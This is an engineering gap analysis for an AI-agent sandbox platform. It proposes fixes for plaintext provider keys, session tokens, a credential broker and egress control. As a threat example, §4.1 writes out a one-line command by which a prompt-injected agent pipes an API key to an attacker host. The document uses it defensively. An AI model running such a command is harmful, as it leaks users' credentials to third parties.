# 04 · Gap Analysis — Breakages, Issues, Missing Pieces

This document answers the user's core question: *"find out where all the breakages are for this sandbox system, where all the issues are, and what we would actually need to do."*

Every gap is classified by severity and tagged with an effort estimate.

## 4.0 · Summary Table

| # | Gap | Severity | Effort | Category |
|---|---|---|---|---|
| 4.1 | Plaintext provider keys injected at sandbox boot | **Critical** (security) | 2–3 days | Trust boundary |
| 4.2 | No session-scoped credential (`sess_tok_…`) | **Critical** (security) | 1–2 days | Trust boundary |
| 4.3 | No Credential Broker | **Critical** (security) | 2–3 days | Trust boundary |
| 4.4 | No hostname-level egress allowlist | **High** (security) | 3–5 days | Trust boundary |
| 4.5 | No `Environment` resource | **Critical** (functional) | 2–3 days | Missing primitive |
| 4.6 | No unified `Artifact` model | **Medium** | 2 days | Missing primitive |
| 4.7 | Event envelope not spec-standard | **Medium** | 1 day | Interop |
| 4.8 | No SSE endpoint (only WebSocket) | **Medium** | 2–4 hours | Interop |
| 4.9 | No generic HMAC-signed webhook dispatcher | **Medium** | 2 days | Interop |
| 4.10 | No multiplayer ACL on sessions | **Low** | 2 days | Feature |
| 4.11 | No public SDK (TS + Python) | **Medium** | 2–3 days | DX |
| 4.12 | No Modal provider | **Medium** | 1 week | Provider |
| 4.13 | No GitHub App (Model B) | **Low** | 2–3 days | Feature |
| 4.14 | Quota dims incomplete | **Low** | 1 day | Enforcement |
| 4.15 | No idempotency key support | **Low** | 1 day | Interop |
| 4.16 | No error envelope standardization | **Low** | 1 day | Interop |

**Total: ~5–6 weeks of focused engineering.** Critical items (§4.1–4.5) alone = ~2 weeks and close the actively-exploitable gaps.

## 4.1 · Plaintext provider keys in sandbox env — **CRITICAL**

### The bug

`backend/omoi_os/models/user_credentials.py` stores Anthropic/OpenAI/etc. keys as plaintext `api_key: str`. The orchestrator retrieves these and passes them in `env_vars` to `spawn_for_task`, which lands as `ANTHROPIC_API_KEY` inside the sandbox.

### Why it's critical

A prompt-injected or otherwise-compromised agent can:
```bash
echo $ANTHROPIC_API_KEY | curl -X POST attacker.com/exfil -d @-
```

The user's Anthropic budget is now attacker-controlled until they manually rotate. With 5 concurrent agents and $100/h budget, attacker has ~$500 of Claude usage before anyone notices.

### What the spec wants

Session-scoped, ephemeral minting via the Broker. The sandbox never sees a long-lived key. If compromised, the worst case is one session's remaining lifetime (~1h) of Claude usage.

### Fix

1. Add `kind='session'` to `APIKey` with `expires_at` set to 1h from mint time
2. Inject `SESSION_TOKEN=sess_tok_…` into the sandbox instead of raw provider keys
3. Write a tiny in-sandbox helper (`opencode auth login --token $SESSION_TOKEN` or similar) that calls the Broker for actual provider keys on demand
4. See §4.3 for the Broker itself

**Effort:** 2–3 days (coupled with §4.2, §4.3).

**Files touched:**
- `backend/omoi_os/models/auth.py` — add `kind` column, `expires_at` enforcement
- `backend/omoi_os/services/auth_service.py` — new `create_session_token()` method
- `backend/omoi_os/workers/orchestrator_worker.py` — replace env-var injection with session token
- Sandbox bootstrap script — fetch keys from Broker at boot

## 4.2 · No session-scoped credential (`sess_tok_…`) — **CRITICAL**

### The bug

OmoiOS has two API-key scopes: user-scoped and agent-scoped. There is no "this specific task's credential" kind. Consequences:

- Nothing constrains blast radius of a compromised sandbox to one session
- Sandbox can't authenticate with the Broker (because there is no Broker, and no token to present to it — chicken-and-egg)

### What the spec wants

```python
class APIKey:
    kind: Literal["platform", "user", "session", "agent"]
    subject_id: UUID  # task.id for session; user.id for user; agent.id for agent
    expires_at: datetime  # 1h sliding for session
    scope: list[str]  # ["broker:mint:api.anthropic.com"]
```

### Fix

1. Add `kind` column to `APIKey`
2. Add `scope: list[str]` or use existing `scopes` JSONB
3. New `auth_service.create_session_token(task_id, env_credentials) -> (plaintext, APIKey)`
4. `verify_session_token(token) -> Tuple[Task, APIKey]` with scope check
5. Cron job or DB trigger to revoke expired session tokens

**Effort:** 1–2 days. Can ship with §4.1 and §4.3 as one PR.

## 4.3 · No Credential Broker — **CRITICAL**

### The bug

There is no service that sandboxes can call to fetch provider credentials on demand. Today: credentials are baked into the sandbox at boot and never rotated.

### What the spec wants

`GET /broker/creds/{provider}` with:
- `Authorization: Bearer sess_tok_…`
- Verifies session is alive, in scope, and provider is declared in `environment.credentials`
- Dispatches to one of three binding kinds: `bearer_secret`, `user_oauth`, `github_app`
- Returns `{ token, expires_at, scope }` with a fresh short-lived token
- Logs to audit table (`broker_mint`)

### Fix — ~50 lines of FastAPI

```python
# backend/omoi_os/api/routes/broker.py — NEW
from fastapi import APIRouter, Header, HTTPException
router = APIRouter(prefix="/broker")

@router.get("/creds/{provider}")
async def mint_credential(provider: str, authorization: str = Header(...)):
    token = authorization.removeprefix("Bearer ")
    session_auth = await auth_service.verify_session_token(token)
    if not session_auth:
        raise HTTPException(403, "invalid_session_token")

    task, api_key = session_auth
    env = await get_environment_version(task.environment_id, task.environment_version)
    binding = (env.credentials or {}).get(provider)
    if not binding:
        raise HTTPException(404, "provider_not_declared")

    if binding["kind"] == "bearer_secret":
        sec = await get_secret(task.organization_id, binding["secret_id"])
        return {"token": decrypt(sec.encrypted_value), "expires_at": None, "scope": provider}

    if binding["kind"] == "user_oauth":
        tok = await oauth_service.get_user_oauth_token(task.created_by, binding["provider"])
        if is_expired(tok):
            tok = await oauth_service.refresh(task.created_by, binding["provider"])
        return {"token": tok.access_token, "expires_at": tok.expires_at, "scope": binding["scope"]}

    if binding["kind"] == "github_app":
        return await github_app_service.mint_installation_token(
            task.organization_id, repos=binding["repositories"]
        )

    raise HTTPException(500, f"unknown_binding:{binding['kind']}")
```

### Dependencies

- §4.2 (session token) must land first
- §4.5 (Environment) must exist for `env.credentials` lookup
- §4.13 (GitHub App) is optional — Model A (`user_oauth`) works for small tenants first

**Effort:** 2–3 days.

## 4.4 · No hostname-level egress allowlist — **HIGH**

### The bug

OmoiOS relies on Daytona's network controls, which are IP/CIDR-level. `api.anthropic.com` resolves to a rotating CloudFront pool, so IP allowlists either pass everything Cloudfront routes (breaking isolation) or break the agent by blocking the real endpoint.

### What the spec wants

Two-layer model from `15-modal-integration.md §6`:
1. **Layer 1:** Block all outbound traffic except to the platform's own egress proxy (CIDR allowlist works here — one IP)
2. **Layer 2:** Egress proxy enforces per-session `env.egress.allowed_hosts` with hostname-level rules, reading SNI / Host headers

### Fix

1. Add `EgressProxyService` — a Squid / Envoy / custom Go proxy running alongside the platform
2. At sandbox boot, inject `HTTP_PROXY=http://egress-proxy.platform:3128` + `HTTPS_PROXY=...`
3. Sandbox network ACL allows outbound **only** to the proxy IP
4. Proxy validates each request's Host header against the session's environment allowlist
5. Failed requests log an `egress_denied` event and fail with HTTP 451

### Challenges

- `sandbox_modules/` probably has sidecar-style patterns; adapt
- Envoy with Lua filters is probably the fastest ship; Squid's ACL syntax is archaic
- Must terminate TLS for Host validation if HTTPS — or use SNI sniffing without TLS termination

**Effort:** 3–5 days. Can be cut to 2 days with a minimal custom Go proxy if Envoy adoption is premature.

## 4.5 · No `Environment` resource — **CRITICAL (functional)**

### The bug

OmoiOS currently bakes runtime config into each Task via `Task.execution_config` (JSONB) and `Daytona` snapshots. There's no reusable, versioned, declaratively-egress-controlled entity. Consequences:

- Can't pin a session to an immutable recipe (spec §05 "every version immutable")
- Can't declare `credentials: {…}` per environment (required by Broker — see §4.3)
- Can't safely roll an update (opt-in via version pin unavailable)
- Can't share environments across projects/tasks

### What the spec wants

See `02-spec-overview.md §2.4` — `Environment` model with `image`, `env`, `tools`, `egress`, `resources`, `credentials`, `files`, `exposed_ports`, `persistent_volume`, and versioning.

### Fix

New tables + migration:

```python
# backend/omoi_os/models/environment.py — NEW
class Environment(Base):
    __tablename__ = "environments"
    id: UUID primary_key
    organization_id: UUID FK
    project_id: Optional[UUID] FK  # = workspace
    name: str
    created_at: datetime
    deleted_at: Optional[datetime]  # soft delete

class EnvironmentVersion(Base):
    __tablename__ = "environment_versions"
    id: UUID primary_key
    environment_id: UUID FK
    version: int  # monotonic per environment_id
    image: JSONB  # {kind: "platform" | "snapshot" | "dockerfile" | "registry", ref: ...}
    env: JSONB    # {KEY: "literal" | {"$secret": "..."} | {"$broker": "..."}}
    tools: list[str]
    egress: JSONB  # {allowed_hosts: [...], allowed_ports: [...]}
    resources: JSONB  # {cpu, memory_gb, timeout_sec}
    credentials: JSONB  # see spec §13.8 — {<provider>: {kind, ...}}
    files: JSONB  # [{path, content_ref, mode}]
    exposed_ports: list[int]
    persistent_volume: bool
    build_status: str  # building | ready | failed
    built_at: Optional[datetime]
    built_image_ref: Optional[str]
```

- Add `environment_id` + `environment_version` columns to `Task`
- Add routes: `POST/GET /v1/organizations/{org}/environments`, `GET /v1/organizations/{org}/environments/{id}/versions/{n}`
- Rewrite `spawn_for_task` to read from environment version (not ad-hoc `execution_config`)

**Effort:** 2–3 days. This is the foundation for §4.3 and §4.4, so it must land before them.

## 4.6 · No unified `Artifact` model — **MEDIUM**

### The bug

PRs, commits, logs, screenshots are scattered across `TicketPullRequest`, `TicketCommit`, `AgentLog`, and the filesystem (OpenHands persistence_dir). API consumers have to call 3-4 endpoints to see a session's outputs.

### What the spec wants

Unified `GET /v1/organizations/{org}/sessions/{id}/artifacts` returning:
```json
{ "id": "art_…", "session_id": "sess_…", "kind": "pull_request" | "commit" | "file" | "screenshot" | "log",
  "external_url": "...", "payload": {...}, "created_at": "..." }
```

### Fix — two options

**A. Thin adapter (recommended).** Don't migrate data. Create a view or union query that surfaces all artifact-like rows in the spec's shape:

```python
# backend/omoi_os/api/routes/artifacts.py — NEW
@router.get("/sessions/{sid}/artifacts")
async def list_artifacts(sid: str):
    prs = await get_prs_for_task(sid)
    commits = await get_commits_for_task(sid)
    logs = await get_logs_for_task(sid)
    files = await get_files_for_task(sid)
    return unified_artifact_response(prs, commits, logs, files)
```

**B. First-class table (if you want persistence).** Add `artifacts` table with `kind` enum and backfill.

Start with A. Migrate to B only if consumers complain about per-kind fanout.

**Effort:** 2 days (option A).

## 4.7 · Event envelope not spec-standard — **MEDIUM**

### The bug

`Event` has `{ id, event_type, entity_type, entity_id, payload, timestamp }`. Spec wants `{ id, seq, type, session_id, actor, timestamp, data }`.

### Impact

- `Last-Event-Id` resume doesn't work without `seq` (monotonic per session)
- Webhooks can't deduplicate without a session-scoped sequence
- Actor attribution (`"agent"` vs `"user:..."` vs `"system"`) is lost

### Fix

1. Add `seq` column (nullable initially, populate for new events)
2. Add `actor: str` column
3. Rename `entity_id` → `session_id` at serialization time only (DB stays put)
4. Map `event_type` → `type` at serialization time

Wrap at emit:
```python
async def emit_event(type: str, session_id: str, actor: str, data: dict):
    seq = await get_next_seq(session_id)  # Redis INCR for speed
    event = Event(id=ulid(), seq=seq, type=type, session_id=session_id,
                  actor=actor, timestamp=utc_now(), payload=data)
    await db.insert(event)
    await redis_pubsub.publish(f"session:{session_id}", event.dict())
```

**Effort:** 1 day.

## 4.8 · No SSE endpoint — **MEDIUM**

### The bug

Only WebSocket streaming available. Spec wants SSE too (simpler clients, CORS-friendly, browser-native `EventSource`).

### Fix

```python
# backend/omoi_os/api/routes/sessions.py
@router.get("/sessions/{sid}/events")
async def stream_events(sid: str, request: Request, last_event_id: Optional[str] = Header(None)):
    async def gen():
        backlog = await get_events_since(sid, last_event_id)
        for evt in backlog:
            yield f"id: {evt.seq}\ndata: {json.dumps(evt.to_envelope())}\n\n"
        async for evt in event_bus.subscribe(f"session:{sid}"):
            yield f"id: {evt.seq}\ndata: {json.dumps(evt.to_envelope())}\n\n"
    return StreamingResponse(gen(), media_type="text/event-stream")
```

**Effort:** 2–4 hours if event envelope (§4.7) is done; 1 day if done together.

## 4.9 · No generic webhook dispatcher — **MEDIUM**

### The bug

`Project.github_webhook_secret` exists, but only inbound GitHub webhooks are handled. No outbound webhooks to tenant URLs.

### What the spec wants

- `POST /v1/organizations/{org}/webhooks` with `{ url, secret, events: [...] }` → `whsub_…`
- On configured events, enqueue a delivery task
- Delivery signs with HMAC-SHA256: `X-Signature: t=<ts>,v1=<hmac(ts + "." + body)>`
- Exponential backoff up to 24h on 5xx / timeout
- Idempotency via `X-Event-Id` header

### Fix

New tables + service:
```python
# models/webhook.py — NEW
class WebhookSubscription(Base):
    id: UUID, organization_id: UUID FK, url: str, secret: str, events: list[str], active: bool

class WebhookDelivery(Base):
    id: UUID, subscription_id: UUID FK, event_id: str, attempts: int,
    next_retry_at: Optional[datetime], last_response_code: Optional[int], delivered_at: Optional[datetime]
```

New worker: `webhook_dispatcher.py` subscribes to event bus, filters against subscriptions, enqueues deliveries.

**Effort:** 2 days.

## 4.10 · No multiplayer ACL on sessions — **LOW**

### The bug

Tasks are owned by the assigned agent; no user-level viewer/editor/owner roles on individual tasks. Only org-level RBAC.

### What the spec wants

```python
POST /v1/organizations/{org}/sessions/{id}/share
{ "grants": [{ "user_id": "usr_…", "role": "editor" }] }
```

Role matrix:
- `owner` — full control, delete, re-share
- `editor` — send messages, cancel, fork
- `viewer` — read events, artifacts, editor URL

### Fix

```python
# models/task_acl.py — NEW
class TaskAcl(Base):
    task_id: UUID FK
    user_id: UUID FK
    role: Enum["owner", "editor", "viewer"]
    granted_at: datetime
```

Authorization check:
```python
async def check_session_role(task_id, user_id, required: set[str]) -> bool:
    acl = await db.get(TaskAcl, (task_id, user_id))
    return acl and acl.role in required
```

**Effort:** 2 days.

## 4.11 · No public SDK — **MEDIUM**

### The bug

Customers currently hit REST directly. No TypeScript or Python SDK.

### What the spec wants

`09-sdks.md` — `AgentClient` with resource-oriented surface (`client.sessions`, `client.environments`, `client.secrets`, etc.). AsyncIterable streams. Two auth modes (`apiKey` for server, `userToken` for browser).

### Fix

FastAPI already emits OpenAPI. Two options:

**A. Auto-generate.** Use `openapi-typescript-codegen` for TS and `openapi-python-client` for Python. ~1 hour to scaffold, 1 day to polish.

**B. Hand-write.** Matches the `09-sdks.md` shape exactly. Better DX. 2–3 days.

Start with A (ship fast), upgrade to B when the shape stabilizes.

**Effort:** 2–3 days.

## 4.12 · No Modal provider — **MEDIUM**

### The bug

OmoiOS has Daytona + LocalDocker. Spec proposes Modal for:
- Faster cold starts (with warm pool)
- Mature Python SDK (OmoiOS is Python — this is the right language choice)
- Built-in tunnels, secrets, volumes

### Fix

New `ModalProvider` implementing `SandboxProvider` Protocol. Per `15-modal-integration.md §4`, translate:
- `env.image.kind: "platform"` → `modal.images.fromRegistry(ref)`
- `env.image.kind: "snapshot"` → `modal.images.fromRegistry(internal_registry_ref, secret=…)`
- `env.credentials[bearer_secret]` → per-session `modal.secrets.fromObject({...})`
- `env.exposed_ports` → `encryptedPorts: [...]` + `sandbox.tunnels()[port].url`
- `env.persistent_volume` → `volumes: { "/workspace": modal.volumes.fromName(ws_<workspace_id>) }`

Use Python SDK (mature), not TS. OmoiOS is Python already — no cross-language bridge needed.

Flag:
```python
# config/settings.py
sandbox:
  provider: "modal"  # was: "daytona" | "local"
```

Parallel run: ship with per-org override (`Organization.sandbox_provider: str | None`) so you can flip one tenant at a time.

**Effort:** 1 week (including testing, warm pool, tunnel auth).

## 4.13 · No GitHub App (Model B) — **LOW**

### The bug

Only Model A (user-linked personal GitHub) supported. For tenant-org access that survives users leaving, spec recommends Model B — GitHub App installation tokens.

### Fix

New table `githubInstallation` with `installation_id`, `organization_id`. Setup handler at `/integrations/github/setup?installation_id=...`. Minting via `@octokit/auth-app` equivalent — actually there's no great Python equivalent; use `PyJWT` + GitHub App private key to mint JWT, then POST to `/app/installations/{id}/access_tokens` yourself. ~50 lines.

**Effort:** 2–3 days.

## 4.14 · Quota dims incomplete — **LOW**

### Bug

`Organization.max_concurrent_agents` exists. Missing:
- `sessions_per_minute` (token bucket)
- `monthly_compute_seconds`
- `monthly_tokens_input` / `monthly_tokens_output`
- `sandbox_egress_mb_per_session`

Current implementation covers $ (via `Budget`), not compute seconds or tokens as monthly limits.

### Fix

- Add columns to `Organization.limits: JSONB` (or dedicated columns)
- Redis counters with TTL for `concurrent_sessions`, `sessions_per_minute`
- Monthly aggregate jobs for the slow-moving dims (already partially in place via cost tracking)
- Emit `usage.threshold_crossed` event at 80%

**Effort:** 1 day.

## 4.15 · No idempotency key support — **LOW**

### Bug

`POST /tasks` can create duplicates on retry. Spec requires `Idempotency-Key` header dedup.

### Fix

- Redis `SET NX` with `idempotency:{org}:{key}` → `task_id` for 24h
- Middleware on `POST` routes that checks and short-circuits

**Effort:** 1 day.

## 4.16 · No error envelope standardization — **LOW**

### Bug

FastAPI's default `{"detail": "..."}` doesn't match spec's `{"error": {"code": "...", "type": "...", "message": "...", "retry_after_seconds": ..., "request_id": "...", "docs_url": "..."}}`.

### Fix

Custom exception handler that maps HTTPException + domain errors to the spec envelope.

**Effort:** 1 day.

## 4.17 · Non-Gaps (don't touch)

Things the spec mentions but OmoiOS should **not** change:

- **Better Auth migration** — OmoiOS has working auth; Better Auth's value is in greenfield. §17 of spec is explicit: "You probably don't want it."
- **Monorepo restructuring** — OmoiOS has `backend/` + `frontend/` + `subsystems/` with uv workspaces. Works. Leave alone.
- **Task → Session DB rename** — API alias is enough; touching DB = migration risk + billing-integration risk.
- **FastAPI removal** — §16 is for greenfield. §17 is for OmoiOS. FastAPI stays.
- **Next.js → hosted editor iframe** — out of scope for sandbox-system completeness; demand-driven feature.

## 4.18 · The Two-Week Critical Path

If you had to ship the most security-and-completeness value in two weeks:

| Week | Work | Closes |
|---|---|---|
| 1.1 | Environment resource (§4.5) | Foundational |
| 1.2 | Session token (§4.2) | Trust boundary |
| 1.3 | Credential Broker (§4.3) | Trust boundary |
| 2.1 | Egress proxy (§4.4) | Trust boundary |
| 2.2 | Event envelope (§4.7) + SSE (§4.8) | Interop |
| 2.3 | Artifact adapter (§4.6) | Interop |
| 2.4 | SDK scaffold (§4.11) | DX |

**After 2 weeks:** All four critical security gaps closed, spec-compliant API surface, foundation for Modal and multiplayer follows.

Next: [`05-implementation-strategies.md`](./05-implementation-strategies.md) — TS rewrite vs FastAPI refactor, honest comparison.
